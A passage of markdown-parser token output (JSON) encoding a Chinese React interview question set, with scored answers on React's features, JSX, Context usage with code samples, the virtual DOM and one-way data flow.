合理设计组件层级","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 避免不必要的渲染：\\n  + 使用React.lazy进行代码分割\\n  + 使用虚拟列表处理长列表\\n  + 合理设计组件层级","task":false,"loose":false,"text":"**1：** 避免不必要的渲染：\\n+ 使用React.lazy进行代码分割\\n+ 使用虚拟列表处理长列表\\n+ 合理设计组件层级","tokens":[{"type":"text","raw":"**1：** 避免不必要的渲染：\\n","text":"**1：** 避免不必要的渲染：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 避免不必要的渲染：","text":" 避免不必要的渲染：","escaped":false}]},{"type":"list","raw":"+ 使用React.lazy进行代码分割\\n+ 使用虚拟列表处理长列表\\n+ 合理设计组件层级","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 使用React.lazy进行代码分割\\n","task":false,"loose":false,"text":"使用React.lazy进行代码分割","tokens":[{"type":"text","raw":"使用React.lazy进行代码分割","text":"使用React.lazy进行代码分割","tokens":[{"type":"text","raw":"使用React.lazy进行代码分割","text":"使用React.lazy进行代码分割","escaped":false}]}]},{"type":"list_item","raw":"+ 使用虚拟列表处理长列表\\n","task":false,"loose":false,"text":"使用虚拟列表处理长列表","tokens":[{"type":"text","raw":"使用虚拟列表处理长列表","text":"使用虚拟列表处理长列表","tokens":[{"type":"text","raw":"使用虚拟列表处理长列表","text":"使用虚拟列表处理长列表","escaped":false}]}]},{"type":"list_item","raw":"+ 合理设计组件层级","task":false,"loose":false,"text":"合理设计组件层级","tokens":[{"type":"text","raw":"合理设计组件层级","text":"合理设计组件层级","tokens":[{"type":"text","raw":"合理设计组件层级","text":"合理设计组件层级","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 7. 什么是 React？它的主要特点是什么？\\n\\n","depth":2,"text":"7. 什么是 React？它的主要特点是什么？","tokens":[{"type":"text","raw":"7. 什么是 React？它的主要特点是什么？","text":"7. 什么是 React？它的主要特点是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- React 是一个用于构建用户界面的 JavaScript 库，由 Facebook 开发并维护。它主要用于构建单页应用程序（SPA）和复杂的用户界面。React 的主要特点包括：\\n\\n- 组件化：React 将 UI 分解成独立的、可重用的组件。每个组件都有自己的逻辑和控制。\\n\\n- 虚拟 DOM：React 使用虚拟 DOM 来提高性能。虚拟 DOM 是一个内存中的树结构，React 会先在虚拟 DOM 中进行操作，然后批量更新真实 DOM。\\n\\n- 声明式编程：React 采用声明式编程风格，开发者只需描述 UI 应该是什么样的，React 会负责处理 UI 的变化。\\n\\n- JSX：React 使用 JSX（JavaScript XML）语法，允许在 JavaScript 中编写类似 HTML 的标记。\\n\\n- 生态系统丰富：React 拥有丰富的生态系统，包括路由器（React Router）、状态管理库（Redux、MobX）等。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- React 是一个用于构建用户界面的 JavaScript 库，由 Facebook 开发并维护。它主要用于构建单页应用程序（SPA）和复杂的用户界面。React 的主要特点包括：\\n\\n","task":false,"loose":true,"text":"React 是一个用于构建用户界面的 JavaScript 库，由 Facebook 开发并维护。它主要用于构建单页应用程序（SPA）和复杂的用户界面。React 的主要特点包括：\\n","tokens":[{"type":"text","raw":"React 是一个用于构建用户界面的 JavaScript 库，由 Facebook 开发并维护。它主要用于构建单页应用程序（SPA）和复杂的用户界面。React 的主要特点包括：\\n","text":"React 是一个用于构建用户界面的 JavaScript 库，由 Facebook 开发并维护。它主要用于构建单页应用程序（SPA）和复杂的用户界面。React 的主要特点包括：","tokens":[{"type":"text","raw":"React 是一个用于构建用户界面的 JavaScript 库，由 Facebook 开发并维护。它主要用于构建单页应用程序（SPA）和复杂的用户界面。React 的主要特点包括：","text":"React 是一个用于构建用户界面的 JavaScript 库，由 Facebook 开发并维护。它主要用于构建单页应用程序（SPA）和复杂的用户界面。React 的主要特点包括：","escaped":false}]}]},{"type":"list_item","raw":"- 组件化：React 将 UI 分解成独立的、可重用的组件。每个组件都有自己的逻辑和控制。\\n\\n","task":false,"loose":true,"text":"组件化：React 将 UI 分解成独立的、可重用的组件。每个组件都有自己的逻辑和控制。\\n","tokens":[{"type":"text","raw":"组件化：React 将 UI 分解成独立的、可重用的组件。每个组件都有自己的逻辑和控制。\\n","text":"组件化：React 将 UI 分解成独立的、可重用的组件。每个组件都有自己的逻辑和控制。","tokens":[{"type":"text","raw":"组件化：React 将 UI 分解成独立的、可重用的组件。每个组件都有自己的逻辑和控制。","text":"组件化：React 将 UI 分解成独立的、可重用的组件。每个组件都有自己的逻辑和控制。","escaped":false}]}]},{"type":"list_item","raw":"- 虚拟 DOM：React 使用虚拟 DOM 来提高性能。虚拟 DOM 是一个内存中的树结构，React 会先在虚拟 DOM 中进行操作，然后批量更新真实 DOM。\\n\\n","task":false,"loose":true,"text":"虚拟 DOM：React 使用虚拟 DOM 来提高性能。虚拟 DOM 是一个内存中的树结构，React 会先在虚拟 DOM 中进行操作，然后批量更新真实 DOM。\\n","tokens":[{"type":"text","raw":"虚拟 DOM：React 使用虚拟 DOM 来提高性能。虚拟 DOM 是一个内存中的树结构，React 会先在虚拟 DOM 中进行操作，然后批量更新真实 DOM。\\n","text":"虚拟 DOM：React 使用虚拟 DOM 来提高性能。虚拟 DOM 是一个内存中的树结构，React 会先在虚拟 DOM 中进行操作，然后批量更新真实 DOM。","tokens":[{"type":"text","raw":"虚拟 DOM：React 使用虚拟 DOM 来提高性能。虚拟 DOM 是一个内存中的树结构，React 会先在虚拟 DOM 中进行操作，然后批量更新真实 DOM。","text":"虚拟 DOM：React 使用虚拟 DOM 来提高性能。虚拟 DOM 是一个内存中的树结构，React 会先在虚拟 DOM 中进行操作，然后批量更新真实 DOM。","escaped":false}]}]},{"type":"list_item","raw":"- 声明式编程：React 采用声明式编程风格，开发者只需描述 UI 应该是什么样的，React 会负责处理 UI 的变化。\\n\\n","task":false,"loose":true,"text":"声明式编程：React 采用声明式编程风格，开发者只需描述 UI 应该是什么样的，React 会负责处理 UI 的变化。\\n","tokens":[{"type":"text","raw":"声明式编程：React 采用声明式编程风格，开发者只需描述 UI 应该是什么样的，React 会负责处理 UI 的变化。\\n","text":"声明式编程：React 采用声明式编程风格，开发者只需描述 UI 应该是什么样的，React 会负责处理 UI 的变化。","tokens":[{"type":"text","raw":"声明式编程：React 采用声明式编程风格，开发者只需描述 UI 应该是什么样的，React 会负责处理 UI 的变化。","text":"声明式编程：React 采用声明式编程风格，开发者只需描述 UI 应该是什么样的，React 会负责处理 UI 的变化。","escaped":false}]}]},{"type":"list_item","raw":"- JSX：React 使用 JSX（JavaScript XML）语法，允许在 JavaScript 中编写类似 HTML 的标记。\\n\\n","task":false,"loose":true,"text":"JSX：React 使用 JSX（JavaScript XML）语法，允许在 JavaScript 中编写类似 HTML 的标记。\\n","tokens":[{"type":"text","raw":"JSX：React 使用 JSX（JavaScript XML）语法，允许在 JavaScript 中编写类似 HTML 的标记。\\n","text":"JSX：React 使用 JSX（JavaScript XML）语法，允许在 JavaScript 中编写类似 HTML 的标记。","tokens":[{"type":"text","raw":"JSX：React 使用 JSX（JavaScript XML）语法，允许在 JavaScript 中编写类似 HTML 的标记。","text":"JSX：React 使用 JSX（JavaScript XML）语法，允许在 JavaScript 中编写类似 HTML 的标记。","escaped":false}]}]},{"type":"list_item","raw":"- 生态系统丰富：React 拥有丰富的生态系统，包括路由器（React Router）、状态管理库（Redux、MobX）等。","task":false,"loose":true,"text":"生态系统丰富：React 拥有丰富的生态系统，包括路由器（React Router）、状态管理库（Redux、MobX）等。","tokens":[{"type":"text","raw":"生态系统丰富：React 拥有丰富的生态系统，包括路由器（React Router）、状态管理库（Redux、MobX）等。","text":"生态系统丰富：React 拥有丰富的生态系统，包括路由器（React Router）、状态管理库（Redux、MobX）等。","tokens":[{"type":"text","raw":"生态系统丰富：React 拥有丰富的生态系统，包括路由器（React Router）、状态管理库（Redux、MobX）等。","text":"生态系统丰富：React 拥有丰富的生态系统，包括路由器（React Router）、状态管理库（Redux、MobX）等。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 8. 什么是 JSX？它有什么优点？\\n\\n","depth":2,"text":"8. 什么是 JSX？它有什么优点？","tokens":[{"type":"text","raw":"8. 什么是 JSX？它有什么优点？","text":"8. 什么是 JSX？它有什么优点？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- JSX 是一种语法扩展，允许在 JavaScript 中编写类似 HTML 的标记。JSX 最终会被编译成普通的 JavaScript 代码.\\n\\n- 可读性强：JSX 使得模板代码更加直观和易读，特别是对于复杂的 UI 结构。\\n\\n- 类型检查：JSX 可以在编译时进行类型检查，减少运行时错误。\\n\\n- 表达式支持：可以在 JSX 中嵌入 JavaScript 表达式，使得动态生成 UI 变得更加方便。\\n\\n- 工具支持：现代开发工具（如 Babel）可以将 JSX 编译成兼容所有浏览器的 JavaScript 代码。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- JSX 是一种语法扩展，允许在 JavaScript 中编写类似 HTML 的标记。JSX 最终会被编译成普通的 JavaScript 代码.\\n\\n","task":false,"loose":true,"text":"JSX 是一种语法扩展，允许在 JavaScript 中编写类似 HTML 的标记。JSX 最终会被编译成普通的 JavaScript 代码.\\n","tokens":[{"type":"text","raw":"JSX 是一种语法扩展，允许在 JavaScript 中编写类似 HTML 的标记。JSX 最终会被编译成普通的 JavaScript 代码.\\n","text":"JSX 是一种语法扩展，允许在 JavaScript 中编写类似 HTML 的标记。JSX 最终会被编译成普通的 JavaScript 代码.","tokens":[{"type":"text","raw":"JSX 是一种语法扩展，允许在 JavaScript 中编写类似 HTML 的标记。JSX 最终会被编译成普通的 JavaScript 代码.","text":"JSX 是一种语法扩展，允许在 JavaScript 中编写类似 HTML 的标记。JSX 最终会被编译成普通的 JavaScript 代码.","escaped":false}]}]},{"type":"list_item","raw":"- 可读性强：JSX 使得模板代码更加直观和易读，特别是对于复杂的 UI 结构。\\n\\n","task":false,"loose":true,"text":"可读性强：JSX 使得模板代码更加直观和易读，特别是对于复杂的 UI 结构。\\n","tokens":[{"type":"text","raw":"可读性强：JSX 使得模板代码更加直观和易读，特别是对于复杂的 UI 结构。\\n","text":"可读性强：JSX 使得模板代码更加直观和易读，特别是对于复杂的 UI 结构。","tokens":[{"type":"text","raw":"可读性强：JSX 使得模板代码更加直观和易读，特别是对于复杂的 UI 结构。","text":"可读性强：JSX 使得模板代码更加直观和易读，特别是对于复杂的 UI 结构。","escaped":false}]}]},{"type":"list_item","raw":"- 类型检查：JSX 可以在编译时进行类型检查，减少运行时错误。\\n\\n","task":false,"loose":true,"text":"类型检查：JSX 可以在编译时进行类型检查，减少运行时错误。\\n","tokens":[{"type":"text","raw":"类型检查：JSX 可以在编译时进行类型检查，减少运行时错误。\\n","text":"类型检查：JSX 可以在编译时进行类型检查，减少运行时错误。","tokens":[{"type":"text","raw":"类型检查：JSX 可以在编译时进行类型检查，减少运行时错误。","text":"类型检查：JSX 可以在编译时进行类型检查，减少运行时错误。","escaped":false}]}]},{"type":"list_item","raw":"- 表达式支持：可以在 JSX 中嵌入 JavaScript 表达式，使得动态生成 UI 变得更加方便。\\n\\n","task":false,"loose":true,"text":"表达式支持：可以在 JSX 中嵌入 JavaScript 表达式，使得动态生成 UI 变得更加方便。\\n","tokens":[{"type":"text","raw":"表达式支持：可以在 JSX 中嵌入 JavaScript 表达式，使得动态生成 UI 变得更加方便。\\n","text":"表达式支持：可以在 JSX 中嵌入 JavaScript 表达式，使得动态生成 UI 变得更加方便。","tokens":[{"type":"text","raw":"表达式支持：可以在 JSX 中嵌入 JavaScript 表达式，使得动态生成 UI 变得更加方便。","text":"表达式支持：可以在 JSX 中嵌入 JavaScript 表达式，使得动态生成 UI 变得更加方便。","escaped":false}]}]},{"type":"list_item","raw":"- 工具支持：现代开发工具（如 Babel）可以将 JSX 编译成兼容所有浏览器的 JavaScript 代码。","task":false,"loose":true,"text":"工具支持：现代开发工具（如 Babel）可以将 JSX 编译成兼容所有浏览器的 JavaScript 代码。","tokens":[{"type":"text","raw":"工具支持：现代开发工具（如 Babel）可以将 JSX 编译成兼容所有浏览器的 JavaScript 代码。","text":"工具支持：现代开发工具（如 Babel）可以将 JSX 编译成兼容所有浏览器的 JavaScript 代码。","tokens":[{"type":"text","raw":"工具支持：现代开发工具（如 Babel）可以将 JSX 编译成兼容所有浏览器的 JavaScript 代码。","text":"工具支持：现代开发工具（如 Babel）可以将 JSX 编译成兼容所有浏览器的 JavaScript 代码。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 9. React中的Context是什么？如何使用？\\n\\n","depth":2,"text":"9. React中的Context是什么？如何使用？","tokens":[{"type":"text","raw":"9. React中的Context是什么？如何使用？","text":"9. React中的Context是什么？如何使用？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **1：** Context的创建和提供：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** Context的创建和提供：","task":false,"loose":false,"text":"**1：** Context的创建和提供：","tokens":[{"type":"text","raw":"**1：** Context的创建和提供：","text":"**1：** Context的创建和提供：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Context的创建和提供：","text":" Context的创建和提供：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```jsx\\nconst ThemeContext = React.createContext(\'light\');\\n\\nfunction App() {\\n  return (\\n    <ThemeContext.Provider value=\\"dark\\">\\n      <ThemedButton />\\n    </ThemeContext.Provider>\\n  );\\n}\\n```","lang":"jsx","text":"const ThemeContext = React.createContext(\'light\');\\n\\nfunction App() {\\n  return (\\n    <ThemeContext.Provider value=\\"dark\\">\\n      <ThemedButton />\\n    </ThemeContext.Provider>\\n  );\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 在类组件中使用Context：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 在类组件中使用Context：","task":false,"loose":false,"text":"**1：** 在类组件中使用Context：","tokens":[{"type":"text","raw":"**1：** 在类组件中使用Context：","text":"**1：** 在类组件中使用Context：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 在类组件中使用Context：","text":" 在类组件中使用Context：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```jsx\\nclass ThemedButton extends React.Component {\\n  static contextType = ThemeContext;\\n  render() {\\n    return <Button theme={this.context} />;\\n  }\\n}\\n```","lang":"jsx","text":"class ThemedButton extends React.Component {\\n  static contextType = ThemeContext;\\n  render() {\\n    return <Button theme={this.context} />;\\n  }\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 在函数组件中使用useContext：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 在函数组件中使用useContext：","task":false,"loose":false,"text":"**1：** 在函数组件中使用useContext：","tokens":[{"type":"text","raw":"**1：** 在函数组件中使用useContext：","text":"**1：** 在函数组件中使用useContext：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 在函数组件中使用useContext：","text":" 在函数组件中使用useContext：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```jsx\\nfunction ThemedButton() {\\n  const theme = useContext(ThemeContext);\\n  return <Button theme={theme} />;\\n}\\n```","lang":"jsx","text":"function ThemedButton() {\\n  const theme = useContext(ThemeContext);\\n  return <Button theme={theme} />;\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** Context的注意事项：\\n  + 避免过度使用Context\\n  + Context值变化会导致所有消费组件重新渲染\\n  + 适合共享全局数据，如主题、用户信息等","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** Context的注意事项：\\n  + 避免过度使用Context\\n  + Context值变化会导致所有消费组件重新渲染\\n  + 适合共享全局数据，如主题、用户信息等","task":false,"loose":false,"text":"**1：** Context的注意事项：\\n+ 避免过度使用Context\\n+ Context值变化会导致所有消费组件重新渲染\\n+ 适合共享全局数据，如主题、用户信息等","tokens":[{"type":"text","raw":"**1：** Context的注意事项：\\n","text":"**1：** Context的注意事项：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Context的注意事项：","text":" Context的注意事项：","escaped":false}]},{"type":"list","raw":"+ 避免过度使用Context\\n+ Context值变化会导致所有消费组件重新渲染\\n+ 适合共享全局数据，如主题、用户信息等","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 避免过度使用Context\\n","task":false,"loose":false,"text":"避免过度使用Context","tokens":[{"type":"text","raw":"避免过度使用Context","text":"避免过度使用Context","tokens":[{"type":"text","raw":"避免过度使用Context","text":"避免过度使用Context","escaped":false}]}]},{"type":"list_item","raw":"+ Context值变化会导致所有消费组件重新渲染\\n","task":false,"loose":false,"text":"Context值变化会导致所有消费组件重新渲染","tokens":[{"type":"text","raw":"Context值变化会导致所有消费组件重新渲染","text":"Context值变化会导致所有消费组件重新渲染","tokens":[{"type":"text","raw":"Context值变化会导致所有消费组件重新渲染","text":"Context值变化会导致所有消费组件重新渲染","escaped":false}]}]},{"type":"list_item","raw":"+ 适合共享全局数据，如主题、用户信息等","task":false,"loose":false,"text":"适合共享全局数据，如主题、用户信息等","tokens":[{"type":"text","raw":"适合共享全局数据，如主题、用户信息等","text":"适合共享全局数据，如主题、用户信息等","tokens":[{"type":"text","raw":"适合共享全局数据，如主题、用户信息等","text":"适合共享全局数据，如主题、用户信息等","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 10. 什么是虚拟 DOM？它是如何工作的？\\n\\n","depth":2,"text":"10. 什么是虚拟 DOM？它是如何工作的？","tokens":[{"type":"text","raw":"10. 什么是虚拟 DOM？它是如何工作的？","text":"10. 什么是虚拟 DOM？它是如何工作的？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- 虚拟 DOM 是一个轻量级的内存中的 DOM 树表示。React 使用虚拟 DOM 来提高性能，避免频繁的操作真实 DOM。\\n\\n- 创建虚拟 DOM：React 在内存中创建一个虚拟 DOM 树。\\n\\n- Diff 算法：当状态改变时，React 会比较新的虚拟 DOM 和旧的虚拟 DOM，找出差异（即最小的变更集合）。\\n\\n- 批量更新：React 将这些差异批量应用到真实 DOM，减少 DOM 操作次数，提高性能。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 虚拟 DOM 是一个轻量级的内存中的 DOM 树表示。React 使用虚拟 DOM 来提高性能，避免频繁的操作真实 DOM。\\n\\n","task":false,"loose":true,"text":"虚拟 DOM 是一个轻量级的内存中的 DOM 树表示。React 使用虚拟 DOM 来提高性能，避免频繁的操作真实 DOM。\\n","tokens":[{"type":"text","raw":"虚拟 DOM 是一个轻量级的内存中的 DOM 树表示。React 使用虚拟 DOM 来提高性能，避免频繁的操作真实 DOM。\\n","text":"虚拟 DOM 是一个轻量级的内存中的 DOM 树表示。React 使用虚拟 DOM 来提高性能，避免频繁的操作真实 DOM。","tokens":[{"type":"text","raw":"虚拟 DOM 是一个轻量级的内存中的 DOM 树表示。React 使用虚拟 DOM 来提高性能，避免频繁的操作真实 DOM。","text":"虚拟 DOM 是一个轻量级的内存中的 DOM 树表示。React 使用虚拟 DOM 来提高性能，避免频繁的操作真实 DOM。","escaped":false}]}]},{"type":"list_item","raw":"- 创建虚拟 DOM：React 在内存中创建一个虚拟 DOM 树。\\n\\n","task":false,"loose":true,"text":"创建虚拟 DOM：React 在内存中创建一个虚拟 DOM 树。\\n","tokens":[{"type":"text","raw":"创建虚拟 DOM：React 在内存中创建一个虚拟 DOM 树。\\n","text":"创建虚拟 DOM：React 在内存中创建一个虚拟 DOM 树。","tokens":[{"type":"text","raw":"创建虚拟 DOM：React 在内存中创建一个虚拟 DOM 树。","text":"创建虚拟 DOM：React 在内存中创建一个虚拟 DOM 树。","escaped":false}]}]},{"type":"list_item","raw":"- Diff 算法：当状态改变时，React 会比较新的虚拟 DOM 和旧的虚拟 DOM，找出差异（即最小的变更集合）。\\n\\n","task":false,"loose":true,"text":"Diff 算法：当状态改变时，React 会比较新的虚拟 DOM 和旧的虚拟 DOM，找出差异（即最小的变更集合）。\\n","tokens":[{"type":"text","raw":"Diff 算法：当状态改变时，React 会比较新的虚拟 DOM 和旧的虚拟 DOM，找出差异（即最小的变更集合）。\\n","text":"Diff 算法：当状态改变时，React 会比较新的虚拟 DOM 和旧的虚拟 DOM，找出差异（即最小的变更集合）。","tokens":[{"type":"text","raw":"Diff 算法：当状态改变时，React 会比较新的虚拟 DOM 和旧的虚拟 DOM，找出差异（即最小的变更集合）。","text":"Diff 算法：当状态改变时，React 会比较新的虚拟 DOM 和旧的虚拟 DOM，找出差异（即最小的变更集合）。","escaped":false}]}]},{"type":"list_item","raw":"- 批量更新：React 将这些差异批量应用到真实 DOM，减少 DOM 操作次数，提高性能。","task":false,"loose":true,"text":"批量更新：React 将这些差异批量应用到真实 DOM，减少 DOM 操作次数，提高性能。","tokens":[{"type":"text","raw":"批量更新：React 将这些差异批量应用到真实 DOM，减少 DOM 操作次数，提高性能。","text":"批量更新：React 将这些差异批量应用到真实 DOM，减少 DOM 操作次数，提高性能。","tokens":[{"type":"text","raw":"批量更新：React 将这些差异批量应用到真实 DOM，减少 DOM 操作次数，提高性能。","text":"批量更新：React 将这些差异批量应用到真实 DOM，减少 DOM 操作次数，提高性能。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 11. React 中的单向数据流是什么意思？\\n\\n","depth":2,"text":"11. React 中的单向数据流是什么意思？","tokens":[{"type":"text","raw":"11. React 中的单向数据流是什么意思？","text":"11. React 中的单向数据流是什么意思？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- 单向数据流 是 React 的核心设计理念之一。在单向数据流中，数据只能从父组件流向子组件，不能反向流动。这种方式使得数据流更加清晰和可控。\\n\\n- 数据一致性：单向数据流确保了数据的一致性，避免了数据的混乱和不可预测的变化。\\n\\n- 易于调试：数据流的单一方向使得调试更加容易，可以更容易地追踪数据的变化。\\n\\n- 可预测性：单向数据流使得应用的状态变化更加可预测，便于维护和扩展。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 单向数据流 是 React 的核心设计理念之一。在单向数据流中，数据只能从父组件流向子组件，不能反向流动。这种方式使得数据流更加清晰和可控。\\n\\n","task":false,"loose":true,"text":"单向数据流 是 React 的核心设计理念之一。在单向数据流中，数据只能从父组件流向子组件，不能反向流动。这种方式使得数据流更加清晰和可控。\\n","tokens":[{"type":"text","raw":"单向数据流 是 React 的核心设计理念之一。在单向数据流中，数据只能从父组件流向子组件，不能反向流动。这种方式使得数据流更加清晰和可控。\\n","text":"单向数据流 是 React 的核心设计理念之一。在单向数据流中，数据只能从父组件流向子组件，不能反向流动。这种方式使得数据流更加清晰和可控。","tokens":[{"type":"text","raw":"单向数据流 是 React 的核心设计理念之一。在单向数据流中，数据只能从父组件流向子组件，不能反向流动。这种方式使得数据流更加清晰和可控。","text":"单向数据流 是 React 的核心设计理念之一。在单向数据流中，数据只能从父组件流向子组件，不能反向流动。这种方式使得数据流更加清晰和可控。","escaped":false}]}]},{"type":"list_item","raw":"- 